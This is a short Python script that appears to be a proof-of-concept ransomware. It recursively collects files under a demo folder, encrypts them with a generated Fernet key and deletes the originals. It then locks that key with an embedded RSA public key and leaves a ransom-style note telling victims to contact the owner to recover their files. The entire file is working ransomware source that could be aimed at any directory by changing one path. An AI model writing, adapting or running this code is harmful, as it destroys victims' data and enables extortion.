import os
import glob
import json
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding


ENCRYPT_GLOBS = [
    './demo/**/*.*'
]
KEY_FILE = 'secret.key'
ENCRYPTED_SUFFIX = '.enc'
LOG_FILE = 'key.log'
PUBLIC_KEY = b'''
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnpzQyfh+9DiPFPmUrU9w
gbmHoM2aw+FO9NrjzpXNW1OdQdCg6mN8mEdCJXy3QUWZ1pc6Hr6QFfdXv2gBQx5W
1H8YPPESIFVwFGzf7qqHEsF41yRYUTEh47PlltsrfnYGd7+jH+yqR12hQawH0Kc4
TPuRQkIxPyRM56zOXjvrd06Y24XHQTYNb+/6lHMctGr/2XHemXz7BVE8KOngxxDG
T7gE5FX2nAgjyPZbM/F4TxOB9hsL2i6nM6qn3UkxT9QQbcNlIyZKjsa8BYFn/3Ei
1UqbNSaPle9rMO3P46yvpMxUBv0OVpBev8V23EXrQApchgDFg1bzMoEtfc1e/YJ8
IQIDAQAB
-----END PUBLIC KEY-----
'''


def generate_key():
    '''Generate fernet synchronous key'''
    return Fernet.generate_key()


def load_public_key():
    return serialization.load_pem_public_key(PUBLIC_KEY)


def seek_files(globs):
    '''Search for files in roots with recursive globs and return list of files without duplicates.'''
    files = set()
    for g in globs:
        files |= set( glob.glob(g, recursive=True) )
    return list(files)


def encrypt_files(files, key):
    '''Encrypt the given list of files with fernet and remove the originals'''
    fernet = Fernet(key)
    encrypted = []
    for file in files:
        output = f'{file}{ENCRYPTED_SUFFIX}'
        try:
            with open(file, "rb") as f:
                data = f.read()
            data = fernet.encrypt(data)
            with open(output, "wb") as f:
                f.write(data)
            os.remove(file)
            encrypted.append({
                'in': file,
                'out': output
            })
        except Exception:
            pass
    return encrypted


def save_encrypted_key(file, sym_key):
    key = load_public_key()
    cipher = key.encrypt(
        sym_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    with open(file, 'w') as f:
        f.write('This key has been encrypted and only recoverable by the owner.\n')
        f.write('Contact them about the acces to the key and your files will be saved.\n\n')
        f.write(cipher.hex())


def save_encryption_logs(file, logs):
    with open(file, 'w') as f:
        json.dump(logs, f)


def main():
    # Encrypt
    key = generate_key()
    files = seek_files(ENCRYPT_GLOBS)
    encrypted = encrypt_files(files, key)

    # Write log
    save_encrypted_key(KEY_FILE, key)
    save_encryption_logs(LOG_FILE, encrypted)


## Quick tests
# print(seek_files(ENCRYPT_GLOBS))
# generate_key('secret.key')

if __name__ == '__main__':
    main()
